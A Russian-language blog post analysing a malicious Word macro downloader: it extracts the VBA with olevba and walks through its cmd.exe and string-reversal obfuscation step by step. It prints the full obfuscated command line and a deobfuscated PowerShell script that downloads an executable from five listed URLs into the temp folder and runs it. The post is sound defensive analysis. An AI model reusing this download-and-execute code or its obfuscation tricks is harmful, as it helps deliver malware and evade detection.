---
layout: post
title: Анализ одной офисной малвари
tags: [windows, malware analysis]
category: [ru]
---

Я решил подготовить доклад для KHS community на тему свежей офисной малвари. Для этого я зашел на сайт [Virusshare](https://virusshare.com/) и нашел образец со следующими характеристиками:

`VirusTotal Report submitted 2019-02-15 04:37:54 UTC`

`MD5:f7b167150756857c21672842104410e1`

`SHA1:34c457b2db42f0b7039763e92b2b9ae70e2d8e9c`

`SHA256:dd592228c3d1648233f9e29cbdc8c687a980fc9e873196f4d92ff693ad9f9753`

`File Type:XML 1.0 document, ASCII text, with very long lines, with CRLF line terminators`

`Detections: Kaspersky = HEUR:Trojan-Downloader.MSOffice.SLoad.gen`

Анализ проводился, используя _Windows 7 SP 1 Ultimate_, _Office 2007_. Скачиваем и естественно сразу открываем (на виртуалке :))! Видим такое окно

![](/assets/images/ru//OfficeMalware/1_doc_macro.png)

Ага! Значит документ содержит макрос и нас об этом предупреждают. Само тело документа выглядит так:

![](/assets/images/ru//OfficeMalware/2_doc_deception_message.png)

Злоумышленники просят нас включить работу макросов и позволить редактирование документа. Когда вы скачиваете любой office файл с интернета, он идет со специальной пометкой "Скачан из интернета" и являются нередактируемыми, пока вы сами не укажите обратное. 

Мы поняли, что документ содержит макрос и он скорее всего вредоносный. Чтобы изучить его, нам нужно его каким-то образом выгрузить. Сделать это можно с помощью набора утилит [ole-tools](https://www.decalage.info/python/oletools), а именно [olevba](https://github.com/decalage2/oletools/wiki/olevba). Краткое описание olevba:

_olevba is a script to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to detect VBA Macros, extract their source code in clear text, and detect security-related patterns such as auto-executable macros, suspicious VBA keywords used by malware, anti-sandboxing and anti-virtualization techniques, and potential IOCs (IP addresses, URLs, executable filenames, etc). It also detects and decodes several common obfuscation methods including Hex encoding, StrReverse, Base64, Dridex, VBA expressions, and extracts IOCs from decoded strings._

olevba определяет подозрительные вещи, которые содержит скрипт, например такие как:
<pre>
+------------+----------------------+-----------------------------------------+
| Type       | Keyword              | Description                             |
+------------+----------------------+-----------------------------------------+
| AutoExec   | autoopen             | Runs when the Word document is opened   |
| Suspicious | Chr                  | May attempt to obfuscate specific       |
|            |                      | strings (use option --deobf to          |
|            |                      | deobfuscate)                            |
| Suspicious | Shell                | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | vbHide               | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | windows              | May enumerate application windows (if   |
|            |                      | combined with Shell.Application object) |
|            |                      | (obfuscation: VBA expression)           |
| Suspicious | Hex Strings          | Hex-encoded strings were detected, may  |
|            |                      | be used to obfuscate strings (option    |
|            |                      | --decode to see all)                    |
| Suspicious | Base64 Strings       | Base64-encoded strings were detected,   |
|            |                      | may be used to obfuscate strings        |
|            |                      | (option --decode to see all)            |
| Suspicious | VBA obfuscated       | VBA string expressions were detected,   |
|            | Strings              | may be used to obfuscate strings        |
|            |                      | (option --decode to see all)            |
| IOC        | cmd.exe              | Executable file name (obfuscation: VBA  |
|            |                      | expression)                             |
</pre>

И подозрительные строки
<pre>
| VBA string | jCgKnc/moc.ssenisubr | "jCgKn" + "c/mo" + "c.sse" + "nisub" +  |
|            | usoh.                | "rusoh."                                |
| VBA string | www//:ptth@Mw6O63Df_ | "www//:" + "ptth@" + "Mw6O6" + "3Df_" + |
|            | Cm066CcdkU7o/moc     | "Cm066C" + "cdkU" + "7o/moc"            |
| VBA string | .aicizyhp.www//:ptth | ".ai" + "cizy" + "hp.ww" + "w//:pt" +   |
|            | @j7OEo_7             | "th@j" + "7OEo_7"                       |
| VBA string | MhAbZp6jnHp/zt.oc.sk | "MhAbZ" + "p6jnH" + "p/z" + "t.oc.s" +  |
|            | eeg                  | "keeg"                                  |
| VBA string | t.liam//:ptth@8or1uz | "t.liam" + "//:" + "ptt" + "h@8or1" +   |
|            | sdZ8vie/RXI/sedulcni | "uzsd" + "Z8vi" + "e/RXI/" + "sed" +    |
|            | -                    | "ulcni-"                                |
</pre>

Очевидно, что применяется обфускация. Причем по строке `www//:ptth@Mw6O63Df_` можно догадаться, что некоторые строки находятся в перевернутом состоянии. 

olevba содержит опцию:

`--deobf               Attempt to deobfuscate VBA expressions (slow)`

Экспортируем макросы командой:

`olevba.exe --deobf malware_sample > result.txt`

В итоге получаем исходный код основного макроса

![](/assets/images/ru//OfficeMalware/3-source%20code.png)

Как мы видим, он обфусцирован. Просто смотреть на такой код бесполезно, надо его дебажить! Откроем вкладку _Developer_ в ворде и нажмем кнопку _Visual Basic_

![](/assets/images/ru//OfficeMalware/4_word_macros_developer.png)

Вставляем исходник экспортированный на прошлом шаге:

![](/assets/images/ru//OfficeMalware/5_source.png)

Обратите внимание на то, что обведено красным кружочком. Это наш entry point. В нем мы видим вызов функции с непонятной строкой. Чтобы выяснить, что это за строка, мы немного меняем код на сохранение аргумента в одну строку и делаем _Add Watch_ на нее, чтобы при дебаге увидеть значение.

![](/assets/images/ru//OfficeMalware/6_export_arg_str.png)

В итоге эта строка равна:

`c:\onjzioi\izwolr\poicwo\..\..\..\windows\system32\cmd.exe /c %ProgramData:~0,1%%ProgramData:~9,2% /V:ON/C"set SiQ=;'cjqhpb'=qijmnd$}}{hctac}};kaerb;'bchkzfb'=dqkzr$;hkjzjlz$ metI-ekovnI{ )00004 eg- htgnel.)hkjzjlz$ metI-teG(( fI;'jrkjik'=ciikdj$;)hkjzjlz$ ,qjcaki$(eliFdaolnwoD.irhwidj${yrt{)ujbwa$ ni qjcaki$(hcaerof;'exe.'+zbwnifi$+'\'+pmet:vne$=hkjzjlz$;'ziwmvv'=pzrifoh$;'904' = zbwnifi$;'scjmbw'=fmsqvii$;)'@'(tilpS.'41fpegeLDajCgKnc/moc.ssenisubrusoh.www//:ptth@Mw6O63Df_Cm066CcdkU7o/moc.aicizyhp.www//:ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam//:ptth@8or1uzsdZ8vie/RXI/sedulcni-pw/moc.srevirehtybkramdnal//:ptth@R8Fd3N9UmbYBzI/ten.enoniletoh.www//:ptth'=ujbwa$;tneilCbeW.teN tcejbo-wen=irhwidj$;'imsizuu'=iijirwb$ ll%1,3-~:PMET%h%1,4-~:EMANNOISSES%r%1,5~:CILBUP%wop&&for /L %h in (657,-1,0)do set nu=!nu!!SiQ:~%h,1!&&if %h equ 0 echo !nu:~-658!| cmd" `

Эта строка передается в функцию `ziilnp()`, которая имеется следующий синтаксис:
<pre>
Function ziilnp(zdwrhc)
On Error Resume Next
   Select Case bofcsp
      Case 600812771
         zssvqbs = CStr(rfolwz)
         infpjz = CStr(fiuwjmh)
      Case 691931294
         qhplj = cufwqqj
         lcbfq = Hex(751111903)
      Case 693375610
         swkjiw = wiiwsh
         jiuaoso = Log(311238894)
End Select
   Select Case qvkomu
      Case 676369523
         wvhzs = CStr(sffmkpj)
         zwfzq = CStr(maljh)
      Case 613766996
         tljjc = jjqcvpt
         opopw = Hex(446181185)
      Case 540556815
         qvwhtl = dtwfas
         nzjoo = Log(576824669)
End Select
ziilnp = ziilnp(Interaction.Shell(zdwrhc, vbHide))
   Select Case rmwhcfv
      Case 974865143
         wazknzq = CStr(jvdnm)
         jzvuil = CStr(ltmph)
      Case 351660802
         mffqwz = djhiwo
         onwvdm = Hex(505454459)
      Case 428217029
         wtkadzs = ihdpjs
         bizczv = Log(97188184)
End Select
</pre>

Куча бесполезных select - это последствия обфускации, на это можем не обращать внимание. Что нас больше всего интересует, так это строка:

`ziilnp = ziilnp(Interaction.Shell(zdwrhc, vbHide))`

Interaction.Shell - выполняет переданную команду (нашу строку). Разберем подробнее наш пейлоад:

`c:\onjzioi\izwolr\poicwo\..\..\..\windows\system32\cmd.exe` - здесь избегается детектирование по прямому пути к cmd.exe, используя Directory traversal attack.

`/c %ProgramData:~0,1%%ProgramData:~9,2%` - это передается на выполнение cmd.exe. %ProgramData% - это C:\ProgramData. ~0,1 - означает, начиная с 0-го элемента, вывести 1 символ - "C". ~9,2 - с 9-го элемента, берем два символа - "mD". В итоге получаем строку "CmD":

![](/assets/images/ru//OfficeMalware/echo%20obfuscated%20program%20data.png)

Это один из методов обфускации вызова cmd.exe, наряду с %COMSPEC%. Оставшаяся часть строки:

`/V:ON/C"set SiQ=;'cjqhpb'=qijmnd$}}{hctac}};kaerb;'bchkzfb'=dqkzr$;hkjzjlz$ metI-ekovnI{ )00004 eg- htgnel.)hkjzjlz$ metI-teG(( fI;'jrkjik'=ciikdj$;)hkjzjlz$ ,qjcaki$(eliFdaolnwoD.irhwidj${yrt{)ujbwa$ ni qjcaki$(hcaerof;'exe.'+zbwnifi$+'\'+pmet:vne$=hkjzjlz$;'ziwmvv'=pzrifoh$;'904' = zbwnifi$;'scjmbw'=fmsqvii$;)'@'(tilpS.'41fpegeLDajCgKnc/moc.ssenisubrusoh.www//:ptth@Mw6O63Df_Cm066CcdkU7o/moc.aicizyhp.www//:ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam//:ptth@8or1uzsdZ8vie/RXI/sedulcni-pw/moc.srevirehtybkramdnal//:ptth@R8Fd3N9UmbYBzI/ten.enoniletoh.www//:ptth'=ujbwa$;tneilCbeW.teN tcejbo-wen=irhwidj$;'imsizuu'=iijirwb$ ll%1,3-~:PMET%h%1,4-~:EMANNOISSES%r%1,5~:CILBUP%wop&&for /L %h in (657,-1,0)do set nu=!nu!!SiQ:~%h,1!&&if %h equ 0 echo !nu:~-658!| cmd"` 

Параметр /V:ON, судя по справке:
<pre>
/V:ON Enable delayed environment variable expansion 
         this allows a FOR loop to specify !variable! instead of %variable% 
         expanding the variable at execution time instead of at input time.
</pre>

позволяет переменной получать новое значение в каждой итерации цикла FOR.

Далее идет сама команда на выполнение. Разобьем ее на две части. 
1-ая часть:`set SiQ=;'cjqhpb'=qijmnd$}}{hctac}};kaerb;'bchkzfb'=dqkzr$;hkjzjlz$ metI-ekovnI{ )00004 eg- htgnel.)hkjzjlz$ metI-teG(( fI;'jrkjik'=ciikdj$;)hkjzjlz$ ,qjcaki$(eliFdaolnwoD.irhwidj${yrt{)ujbwa$ ni qjcaki$(hcaerof;'exe.'+zbwnifi$+'\'+pmet:vne$=hkjzjlz$;'ziwmvv'=pzrifoh$;'904' = zbwnifi$;'scjmbw'=fmsqvii$;)'@'(tilpS.'41fpegeLDajCgKnc/moc.ssenisubrusoh.www//:ptth@Mw6O63Df_Cm066CcdkU7o/moc.aicizyhp.www//:ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam//:ptth@8or1uzsdZ8vie/RXI/sedulcni-pw/moc.srevirehtybkramdnal//:ptth@R8Fd3N9UmbYBzI/ten.enoniletoh.www//:ptth'=ujbwa$;tneilCbeW.teN tcejbo-wen=irhwidj$;'imsizuu'=iijirwb$ ll%1,3-~:PMET%h%1,4-~:EMANNOISSES%r%1,5~:CILBUP%wop`

2-ая часть: `for /L %h in (657,-1,0)do set nu=!nu!!SiQ:~%h,1!&&if %h equ 0 echo !nu:~-658!| cmd`

В первой части, переменной SiQ устанавливается какой-то набор символов. Как мы заметили ранее, она очень похожа на перевернутую строку. Развернет ее и получим:

`pow%PUBLIC:~5,1%r%SESSIONNAME:~-4,1%h%TEMP:~-3,1%ll $bwrijii='uuzismi';$jdiwhri=new-object Net.WebClient;$awbju='http://www.hotelinone.net/IzBYbmU9N3dF8R@http://landmarkbytherivers.com/wp-includes/IXR/eiv8Zdszu1ro8@http://mail.tgeeks.co.tz/pHnj6pZbAhM7_oEO7j@http://www.phyzicia.com/o7UkdcC660mC_fD36O6wM@http://www.hosurbusiness.com/cnKgCjaDLegepf14'.Split('@');$iivqsmf='wbmjcs';$ifinwbz = '409';$hofirzp='vvmwiz';$zljzjkh=$env:temp+'\'+$ifinwbz+'.exe';foreach($ikacjq in $awbju){try{$jdiwhri.DownloadFile($ikacjq, $zljzjkh);$jdkiic='kijkrj';If ((Get-Item $zljzjkh).length -ge 40000) {Invoke-Item $zljzjkh;$rzkqd='bfzkhcb';break;}}catch{}}$dnmjiq='bphqjc';`

Мы были правы, после разворачивания мы видим урлы и корректные ключевые слова. А это значит что разворачивание строки происходит во второй части.

Чтобы понять, как работают эти обе части, я приведу небольшой пример. Допустим мы хотим обфусцировать вызов `help` в `cmd`.
Для этого устанавливаем переменную окружению `siq=pleh`(help наоборот).
`for /L %h in (3,-1,0)do` - цикл с 4 итерациями, на каждую букву
`set nu=!nu!!siq:~%h,1!` - каждую итерацию, мы добавляем к переменной `nu`, значение `siq:~%h,1`, так как `%h` это индекс строки с конца, то мы каждую итерацию составляем строку равную обратной.
`if %h equ 0 echo !nu:~-4! | cmd` - ждем пока каждый символ не обработаем и отправляем результат на выполнение в cmd. В итоге получаем такую команду:
`set siq=pleh&& for /L %h in (3,-1,0)do set nu=!nu!!siq:~%h,1!&& if %h equ 0 echo !nu:~-4! | cmd`

![](/assets/images/ru//OfficeMalware/cmd_help_obfuscation.png)

Тем самым, казалось бы запутанная строка, превратилась в понятную вещь. Аналогично происходит и с нашим пейлодом.

Теперь вернемся к нашему основному пейлоду. Первым делом мы видим строку:
* `pow%PUBLIC:~5,1%r%SESSIONNAME:~-4,1%h%TEMP:~-3,1%ll` - как мы уже можем предположить, это тоже обфусцированная строка.
* `%PUBLIC:~5,1%` - это взятие подстроки из 1 символа, начиная с 5-го в строке `C:\Users\Public`. Результат буква "e"
* далее идет просто буква "r"
* `%SESSIONNAME:~-4,1%` - это взятие подстроки из 1 символа, начиная с 4-го, с конца в строке `Console`. Результат буква "s"
* далее идет просто буква "h"
* `%TEMP:~-3,1%` - это взятие подстроки из 1 символа, начиная с 3-го, с конца, в строке `C:\Users\RDRG\AppData\Local\Temp`. Результат буква "e"
* далее идут просто буквы "ll"
Итого: `powershell`

Дальше идет powershell код:
<pre>
$bwrijii='uuzismi';

$jdiwhri=new-object Net.WebClient;

$awbju='http://www.hotelinone.net/IzBYbmU9N3dF8R@http://landmarkbytherivers.com/wp-includes/IXR/eiv8Zdszu1ro8@http://mail.tgeeks.co.tz/pHnj6pZbAhM7_oEO7j@http://www.phyzicia.com/o7UkdcC660mC_fD36O6wM@http://www.hosurbusiness.com/cnKgCjaDLegepf14'.Split('@');

$iivqsmf='wbmjcs';
$ifinwbz = '409';
$hofirzp='vvmwiz';
$zljzjkh=$env:temp+'\'+$ifinwbz+'.exe';
foreach($ikacjq in $awbju){
	try{
		$jdiwhri.DownloadFile($ikacjq, $zljzjkh);
		$jdkiic='kijkrj';
		If ((Get-Item $zljzjkh).length -ge 40000) {
			Invoke-Item $zljzjkh;
			$rzkqd='bfzkhcb';
			break;
		}
	} catch {
	}
}
$dnmjiq='bphqjc';
</pre>

Приведем в боле понятный вид, убрав все лишнее и переименовав переменные:
<pre>
$webClient=new-object Net.WebClient;

$URLS='http://www.hotelinone.net/IzBYbmU9N3dF8R@http://landmarkbytherivers.com/wp-includes/IXR/eiv8Zdszu1ro8@http://mail.tgeeks.co.tz/pHnj6pZbAhM7_oEO7j@http://www.phyzicia.com/o7UkdcC660mC_fD36O6wM@http://www.hosurbusiness.com/cnKgCjaDLegepf14'.Split('@');

$filenameInTempFolder=$env:temp+'\409.exe';
foreach($url in $URLS){
	try{
		$webClient.DownloadFile($url, $filenameInTempFolder);
		If ((Get-Item $filenameInTempFolder).length -ge 40000) {
			Invoke-Item $filenameInTempFolder;
			break;
		}
	} catch {
	}
}
</pre>
Очевидно, что мы скачиваем каждый файл, по очереди, по урлу, в файл 409.exe, во временную папку и запускаем. К сожалению, эти файлы уже не существуют и дальнейшей анализ невозможен.